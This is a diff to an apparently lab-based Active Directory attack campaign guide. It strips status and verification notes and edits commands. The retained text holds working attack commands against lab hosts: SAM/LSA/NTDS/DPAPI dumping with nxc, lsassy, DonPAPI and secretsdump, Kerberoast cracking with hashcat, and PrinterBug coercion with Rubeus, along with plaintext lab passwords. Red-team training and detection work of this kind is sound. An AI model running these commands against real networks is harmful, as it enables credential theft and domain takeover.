@@ -83,7 +83,6 @@ PHASE 3 — EXECUTION (SQL → GodPotato → SYSTEM on mbr01)
   │  [GAIN] SQL exec on linux01 -> SSSD tickets -> keytab -> NFS -> Podman root  │
   │  Tools: impacket-mssqlclient OPENQUERY, podman exec, klist, mount -t nfs │
   │  Converges: May extract creds that help Phase 6 (not required)           │
-  │  Status: WT044 MSSQL linked-server pivot verified live                   │
   └──────────────────────────────────────────────────────────────────────────
 
 
@@ -120,17 +119,11 @@ PHASE 4 — DISCOVERY (BloodHound as analyst_cloud)
   │  [SEED] eng_agentic / Ag3nt1c_Eng!  ← obtained via WT031 password spray  │
   │  [GAIN] cadre.local DA via ForceChangePassword (ACE#7) or GenericAll     │
   │  Key:   ACE#7 = hunter_dfir → chief_command: ForceChangePassword       │
-  │         ACE#7 verified live (was missing; restored via playbook fix)     │
   │         ACE#5 = analyst_dfir → OU=Command: GenericAll                  │
   │         ACE#13+14 = eng_agentic → DC=cadre: GetChanges+All (DCSync)      │
   │  Tools: bloodyAD set password, PowerView Add-DomainObjectAcl             │
   │  Converges: Skip Phase 5-6-7 entirely — go straight to Phase 8           │
   │             with chief_command (DA) or eng_agentic (DCSync rights)       │
-  │  ─────────────────────────────────────────────────────────────────────   │
-  │  ✅  CREDENTIAL GAP SOLVED: WT031 password spray against dc01 with       │
-  │      cadre_passwords.txt yielded `chief_command`, `analyst_dfir`,         │
-  │      `analyst_cloud`. `hunter_dfir` password `DF1R_Hunt3r!` added to      │
-  │      wordlist. ACE#7 ForceChangePassword verified live.                  │
   └──────────────────────────────────────────────────────────────────────────
   ───────────────────────────────────────────────────────────────────────────
   │  BRANCH B — ADCS (diverges here, alternative to spine P5-P7)            │
@@ -148,7 +141,7 @@ PHASE 4 — DISCOVERY (BloodHound as analyst_cloud)
   └──────────────────────────────────────────────────────────────────────────
 
 
-PHASE 5 — COERCION + DELEGATION (Capture dc02$ TGT) ⏳ TRIGGER VERIFIED / CAPTURE PENDING
+PHASE 5 — COERCION + DELEGATION (Capture dc02$ TGT)
 ═══════════════════════════════════════════════════════════════════════════════
   Source: ws01 → SYSTEM on mbr01
   Target: dc02 (.11) coerced to auth to mbr01 (.22)
@@ -157,11 +150,7 @@ PHASE 5 — COERCION + DELEGATION (Capture dc02$ TGT) ⏳ TRIGGER VERIFIED / CAP
   Key:    mbr01$ has TrustedForDelegation=True (unconstrained delegation)
           SpoolSample triggers dc02$ to authenticate to mbr01
   Tools:  SpoolSample.exe, Rubeus.exe monitor/dump, MS-RPRN (PrinterBug)
-  Detect: Suricata SID:1000050 (12 fires confirmed), Zeek dce_rpc.log
-  Status: ⏳ Trigger verified / capture pending — PrinterBug trigger from ws01→mbr01
-          successfully fires against dc02; Rubeus dump ran but did not yield
-          Kirbi markers for `DC02$`. dc02 prerequisites are now enforced in
-          `04-vulnerabilities.yml`; revisit capture path next.
+  Detect: Suricata SID:1000050 (MS-RPRN), Zeek dce_rpc.log
   ───────────────────────────────────────────────────────────────────────────
   │  ALTERNATIVE: RBCD (WT007) — if unconstrained delegation not available   │
   │  [CRED] svc_mssql or any cred with GenericWrite on target computer       │
@@ -171,20 +160,6 @@ PHASE 5 — COERCION + DELEGATION (Capture dc02$ TGT) ⏳ TRIGGER VERIFIED / CAP
   │  WT031 validated: chief_command / analyst_dfir / analyst_cloud.          │
   │  chief_command is DA+EA in cadre.local → fastest path to root DA.        │
   └──────────────────────────────────────────────────────────────────────────┘
-
-**T102-NOTE (2026-07-30):**
-The T102 path was tested from `ws01` to `dc02` via `mbr01`. `SpoolSample`
-triggered successfully, but the Rubeus capture path did not return Kirbi
-markers for `DC02$`. The playbook now explicitly ensures `dc02` Print Spooler
-and Spooler RPC/SMB firewall prerequisites; the attack remains preserved for
-revisit once those prerequisites are verified in a fresh run.
-
-**Validated fallback:** WT031 password spray against dc01 (cadre.local) yielded
-valid credentials for `chief_command`, `analyst_dfir`, and `analyst_cloud`.
-`chief_command` is a member of Domain Admins and Enterprise Admins in
-cadre.local. This satisfies the Branch A credential gap and allows the
-campaign to proceed straight to Phase 7/8 without a captured dc02$ TGT.
-
 
 PHASE 6 — DCSYNC (Child Domain Admin)
 ═══════════════════════════════════════════════════════════════════════════════
@@ -230,14 +205,6 @@ PHASE 8 — CROSS-FOREST + SCCM (range.local Domain Admin)
   │         -> WT037 CMPivot -> WT038 App Deploy -> WT039 Site Takeover         │
   │  Tools: SharpSCCM.exe get naa / get pxe / client-push / cmpivot / exec   │
   │  Converges: This IS Phase 8 completion — no separate convergence         │
-  │  Status: WT034 verified; WT037 CMPivot ✅ VERIFIED 2026-08-02 (live       │
-  │          LogicalDisk data from WS01 client via AdminService as svc_sccm); │
-  │          WT039 script-as-SYSTEM ✅ VERIFIED (ScriptOutput "nt authority\  │
-  │          system" + markers on WS01). Requires: svc_sccm as Full Admin     │
-  │          (Takeover-1 DB grant) + BGB fast channel up (bgbisapi.msi).      │
-  │          WT038 app deploy ✅ FULL EXEC VERIFIED 2026-08-02 (app 16777510 /   │
-  │          assignment 16777217 → payload as SYSTEM on WS01 after mp.msi fix).  │
-  │          WT035 PXE / WT036 Client Push pending.                            │
   └──────────────────────────────────────────────────────────────────────────
 
 
@@ -263,11 +230,11 @@ STREAMS E / F / G — STANDALONE EXERCISES (Not part of campaign narrative)
   2  intern_blue       child.cadre.local   Phase 1 (AS-REP roast)     1     ACE#18 bridge
   3  svc_mssql         child.cadre.local   Phase 2 (Kerberoast)       2     SQL auth, recon
   4  analyst_cloud     cadre.local         Phase 3.5A (Winlogon reg)  3.5   BH, Branch A GPO (T023)
-  5  dc02$             child.cadre.local   Phase 5 (coercion capture) 5     DCSync (BLOCKED)
-  6  child krbtgt      child.cadre.local   Phase 6 (DCSync)           6     Golden Ticket (BLOCKED as written)
-  7  cadre EA          cadre.local         Phase 7 (Golden+ExtraSids) 7     Cross-forest (BYPASSED via WT031 chief_command)
-  8  svc_sccm          range.local         Phase 8 (X-forest roast)   8     Branch C (TGS hash cracked; NAA path verified)
-  9  svc_naa           range.local         Phase 8 (SCCM NAA)         8     range DA, DCSync (verified via vault share)
+  5  dc02$             child.cadre.local   Phase 5 (coercion capture) 5     DCSync
+  6  child krbtgt      child.cadre.local   Phase 6 (DCSync)           6     Golden Ticket
+  7  cadre EA          cadre.local         Phase 7 (Golden+ExtraSids) 7     Cross-forest
+  8  svc_sccm          range.local         Phase 8 (X-forest roast)   8     Branch C
+  9  svc_naa           range.local         Phase 8 (SCCM NAA)         8     range DA, DCSync
   F1 chief_command     cadre.local         Branch A T015 (WT031 seed)  —     root DA+EA, Branch B entry, Branch A post-ex
   ── ───────────────── ─────────────────── ───────────────────────── ────── ───────────────
   S1 hunter_dfir       cadre.local         [SEED] WT031 password spray —     Branch A entry (ACE#7 → chief_command)
@@ -287,7 +254,7 @@ STREAMS E / F / G — STANDALONE EXERCISES (Not part of campaign narrative)
   Full learning experience          Main Spine    (earned in-chain)     Nothing
   Fastest to cadre.local DA         Branch A      hunter_dfir [SEED]    P5, P6, P7
   DA without krbtgt (cert-based)    Branch B      chief_command         P5, P6, P7
-  range.local DA (required)         Branch C      svc_sccm (from P8)    Nothing  ✅ WT034 NAA verified; WT035-039 not yet tested
+  range.local DA (required)         Branch C      svc_sccm (from P8)    Nothing
   Linux post-exploitation           Branch D      analyst_t1 (SQL)      Nothing
 
   NOTE: analyst_t1 is a child.cadre.local user and MUST NOT be used for
@@ -301,20 +268,12 @@ STREAMS E / F / G — STANDALONE EXERCISES (Not part of campaign narrative)
   Problem: Branch A needs cadre.local user creds (hunter_dfir, analyst_dfir,
            eng_agentic) that are NOT produced by the main spine.
 
-  Current state (2026-07-29): ✅ SOLVED. Path 1 (WT031 password spray) was executed
-     against dc01 with an updated `cadre_passwords.txt` and yielded valid
-     credentials for `chief_command`, `analyst_dfir`, and `analyst_cloud`.
-     The `hunter_dfir` password `DF1R_Hunt3r!` was added to the wordlist and
-     used to verify ACE#7 ForceChangePassword live. `lab-seed-creds.json` was
-     also updated with the discovered passwords for automation.
-
   Solution paths (in order of realism):
 
-  1. PASSWORD SPRAY (T031 — Branch G, Phase 1) ✅ USED
+  1. PASSWORD SPRAY (T031 — Branch G, Phase 1)
      ├─ Run kerbrute or nxc against dc01 with cadre_passwords.txt
      ├─ Add hunter_dfir, analyst_dfir, eng_agentic passwords to wordlist
      ├─ Spray AFTER Phase 0 user enum, BEFORE Phase 4 BloodHound
-     └─ Verified: yielded `chief_command`, `analyst_dfir`, `analyst_cloud`
 
   2. USE ANALYST_CLOUD (earned in Phase 3.5A)
      ├─ analyst_cloud is in cadre.local and has ACE#1 (GpoEdit on Vulnerable-GPO)
@@ -322,7 +281,7 @@ STREAMS E / F / G — STANDALONE EXERCISES (Not part of campaign narrative)
      ├─ Realistic: uses earned credential, teaches GPO abuse path
      └─ Limitation: Only covers ACE#1, not ACE#7/ACE#5/ACE#13+14
 
-  3. UPDATE SEED FILE (lab-seed-creds.json) ✅ DONE
+  3. UPDATE SEED FILE (lab-seed-creds.json)
      ├─ Add discovered credentials (chief_command, hunter_dfir, etc.)
      ├─ Mark as "seed" or "spray" source (like analyst_t1)
      ├─ Simplest for automation, but breaks "earn it" narrative
@@ -478,13 +437,6 @@ graph LR
 
 
 **START HERE.** The main spine begins with **Phase 0.5** (initial access on the `ws01` workstation via phishing/file execution). The campaign is built as a multi-hop chain: `ws01 → mbr01 → dc02 → dc01 → range.local`. Each hop uses a different identity, crosses a different sensor boundary, and leaves distinct telemetry.
-
-- **Branch A** — ACL abuse in cadre.local (ForceChangePassword, WriteDacl, GenericWrite, GPO, gMSA, Shadow Creds)
-- **Branch B** — ADCS certificate template abuse (ESC1–14)
-- **Branch C** — SCCM hierarchy takeover (NAA extraction, PXE, site escalation)
-- **Branch D** — Linux post-exploit (MSSQL link, Podman escape, SSSD tickets, NFS, Keytab)
-
-Branches converge back into the main spine — they earn credentials that accelerate or enable the main chain.
 
 - **Branch A** — ACL abuse in cadre.local (ForceChangePassword, WriteDacl, GenericWrite, GPO, gMSA, Shadow Creds)
 - **Branch B** — ADCS certificate template abuse (ESC1–14)
@@ -764,7 +716,7 @@ ldapsearch -x -H ldap://dc01.cadre.local -b "DC=cadre,DC=local" "(&(lastLogon=0)
 **Tool:** [ADeleg](https://github.com/trimarc/ADeleg) (Windows GUI, single `.exe`). Source material at `CADRE-Courses/How to Find Insecure Active Directory Permissions with ADeleg/Episode 173_*.txt` (21,554 bytes).
 
 **Why this exists:** Per the ADeleg podcast Episode 173:
-> "adelec is an active directory delegation management tool ... it gets you almost the same amount of information that bloodhound gets you but with like a third of the hassle — you don't have to set up bloodhound, you don't have to run the sharp pound collector in your environment and trigger all your edr alerts, you don't have to set up docker to like set up the bloodhound ui and node for neoj"
+> "ADeleg is an Active Directory delegation management tool ... it gets you almost the same amount of information that BloodHound gets you but with like a third of the hassle — you don't have to set up BloodHound, you don't have to run the SharpHound collector in your environment and trigger all your EDR alerts, you don't have to set up Docker to set up the BloodHound UI and Neo4j"
 
 **Differentiators from BloodHound (Phase 4):**
 - ✅ **No SharpHound collector** — avoids EDR alerts
@@ -1136,27 +1088,6 @@ Both hashes are in the same file. Crack them:
 hashcat -m 13100 child_tgs.txt /home/vagrant/cadre_passwords.txt
 # svc_mssql → s3rv1c3_MSSQL!
 # analyst_t1 → T13r_An@lyst!
-```
-
-The output file contains TGS hashes for every user with an SPN (2 in this lab). The key hash is `svc_mssql`:
-
-```
-$krb5tgs$23$*svc_mssql$CHILD.CADRE.LOCAL$child.cadre.local/svc_mssql*$<key>$<cipher>
-```
-
-This is a Kerberos TGS hash (hashcat mode 13100 — RC4-HMAC). The format breaks down as:
-
-- `$krb5tgs$23$` — hash type indicator (Kerberos 5 TGS, etype 23)
-- `*svc_mssql` — service account name
-- `$CHILD.CADRE.LOCAL` — domain
-- `$child.cadre.local/svc_mssql` — SPN format
-- `*$<key>$<cipher>` — encrypted ticket data (crackable offline)
-
-Crack with:
-
-```bash
-hashcat -m 13100 child_tgs.txt /home/vagrant/cadre_passwords.txt
-# svc_mssql → s3rv1c3_MSSQL!
 ```
 
 ---
@@ -1786,48 +1717,48 @@ Now we have `nt authority\system` on mbr01 (Phase 3 chain: SQL auth → xp_cmdsh
 
 ```bash
 # SAM database dump (local account hashes)
-nxc smb 192.168.77.22 -u Administrator -p 'Pwn3d_T2!' --sam
+nxc smb 192.168.77.22 -u analyst_t1 -p 'T13r_An@lyst!' --sam
 # Output: local Administrator + service account hashes (crackable)
 
 # LSA secrets dump (service account plaintext passwords)
-nxc smb 192.168.77.22 -u Administrator -p 'Pwn3d_T2!' --lsa
+nxc smb 192.168.77.22 -u analyst_t1 -p 'T13r_An@lyst!' --lsa
 # Output: DC$ machine account, MSSQL service account, possibly analyst_cloud plaintext
 
 # NTDS.dit dump (full domain hashes — DCSync equivalent)
-nxc smb 192.168.77.22 -u Administrator -p 'Pwn3d_T2!' --ntds
+nxc smb 192.168.77.22 -u analyst_t1 -p 'T13r_An@lyst!' --ntds
 # Output: ALL user + computer NTLM hashes for child.cadre.local
 
 # DPAPI secrets dump (Credential Manager, browser, WiFi)
-nxc smb 192.168.77.22 -u Administrator -p 'Pwn3d_T2!' --dpapi
+nxc smb 192.168.77.22 -u analyst_t1 -p 'T13r_An@lyst!' --dpapi
 
 # WinSCP saved session decryption (plaintext creds)
-nxc smb 192.168.77.22 -u Administrator -p 'Pwn3d_T2!' -M winscp
+nxc smb 192.168.77.22 -u analyst_t1 -p 'T13r_An@lyst!' -M winscp
 
 # LAPS password read (if mbr01 has LAPS configured)
-nxc ldap 192.168.77.11 -u Administrator -p 'Pwn3d_T2!' --laps
+nxc ldap 192.168.77.11 -u analyst_t1 -p 'T13r_An@lyst!' --laps
 ```
 
 **Alternative: lsassy** (per Campaign_suggestions.md #94 — 15+ LSASS dump methods):
 
 ```bash
 # From Kali against mbr01 (cleanest remote LSASS dump)
-lsassy -d child.cadre.local -u Administrator -p 'Pwn3d_T2!' 192.168.77.22
+lsassy -d child.cadre.local -u analyst_t1 -p 'T13r_An@lyst!' 192.168.77.22
 # Auto-picks best method (comsvcs, nanodump, procdump, dumpert, ppldump, silentprocessexit, sqldumper)
 # Returns NTLM hashes + Kerberos TGTs + CredMan + DPAPI master keys
 
 # Explicit method
-lsassy -m nanodump -d child.cadre.local -u Administrator -p 'Pwn3d_T2!' 192.168.77.22
+lsassy -m nanodump -d child.cadre.local -u analyst_t1 -p 'T13r_An@lyst!' 192.168.77.22
 ```
 
 **Alternative: DonPAPI** (per Campaign_suggestions.md #93 — DPAPI focus):
 
 ```bash
 # Auto-fetch Domain Backup Key + decrypt all DPAPI secrets
-donpapi collect -u child.cadre.local/Administrator -p 'Pwn3d_T2!' -d child.cadre.local -t 192.168.77.22
+donpapi collect -u child.cadre.local/analyst_t1 -p 'T13r_An@lyst!' -d child.cadre.local -t 192.168.77.22
 # Returns: Chrome/Firefox saved logins, CredMan entries, WiFi passwords, MobaXterm master key, mRemoteNG
 
 # Specific collectors only
-donpapi collect -u Administrator -p 'Pwn3d_T2!' -d child.cadre.local -t 192.168.77.22 --collectors Chromium,CredMan,WiFi
+donpapi collect -u analyst_t1 -p 'T13r_An@lyst!' -d child.cadre.local -t 192.168.77.22 --collectors Chromium,CredMan,WiFi
 ```
 
 **Alternative: Manual mimikatz** (full control, more steps):
@@ -1847,11 +1778,11 @@ dpapi::cred /in:C:\Users\analyst_cloud\AppData\Roaming\Microsoft\Credentials\<cr
 
 ```bash
 # From Kali
-impacket-secretsdump child.cadre.local/Administrator:'Pwn3d_T2!'@192.168.77.22 -just-dc-user krbtgt
+impacket-secretsdump child.cadre.local/analyst_t1:'T13r_An@lyst!'@192.168.77.22 -just-dc-user krbtgt
 # Returns: krbtgt hash + all hashes (need DCSync rights or local admin)
 
 # Full NTDS dump
-impacket-secretsdump child.cadre.local/Administrator:'Pwn3d_T2!'@192.168.77.22 -just-dc
+impacket-secretsdump child.cadre.local/analyst_t1:'T13r_An@lyst!'@192.168.77.22 -just-dc
 ```
 
 **Alternative: SharpHound** (for BloodHound collection as SYSTEM — gets more data):
@@ -2544,13 +2475,13 @@ Copy-Item -Path 'C:\Tools\cadre-attack\Rubeus.exe' -Destination '\\mbr01.child.c
 winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\cadre-attack\Rubeus.exe monitor /targetuser:DC02$ /interval:5 /filtername:DC02$ /output:C:\Tools\cadre-attack\dc02_tgs.txt"
 ```
 
-**Step 3 — Trigger PrinterBug from mbr01 against dc02:**
+**Step 2 — Trigger PrinterBug from mbr01 against dc02:**
 
 ```powershell
 winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\ADTools\MS-RPRN.exe \\dc02.child.cadre.local \\mbr01.child.cadre.local"
 ```
 
-**Step 4 — Collect the captured TGS on mbr01:**
+**Step 3 — Collect the captured TGS on mbr01:**
 
 ```powershell
 winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "Get-Content C:\Tools\cadre-attack\dc02_tgs.txt"
@@ -2826,7 +2757,7 @@ bloodyAD --host dc02 -d child.cadre.local -u svc_mssql -p 's3rv1c3_MSSQL!' \
 | 087   | Pass-the-Hash (T1550.002) | WinSec 4624 Type 3 (NTLM) |
 
 
-### Phase 6 — Privilege Escalation (DCSync — WT009) ⚠️ AS-WRITTEN BLOCKED
+### Phase 6 — Privilege Escalation (DCSync — WT009)
 
 
 |                   |                                                                                      |
@@ -2861,7 +2792,7 @@ export KRB5CCNAME=/tmp/dc02.ccache
 impacket-secretsdump -just-dc child.cadre.local/ -dc-ip 192.168.77.11 -k
 ```
 
-### Phase 7 — Forest Trust Escalation (SID History — WT010-012) ⚠️ BYPASSED
+### Phase 7 — Forest Trust Escalation (SID History — WT010-012)
 
 
 |                   |                                                   |
@@ -2920,7 +2851,7 @@ impacket-psexec cadre.local/Administrator@192.168.77.10 -k -no-pass
 | 089   | Registry Run Key (T1547.001) | Sysmon EID 12-13 |
 
 
-### Phase 8 — Cross-Forest + External Domain (WT033-039) ⚠️ PARTIAL
+### Phase 8 — Cross-Forest + External Domain (WT033-039)
 
 
 |                   |                                                                       |
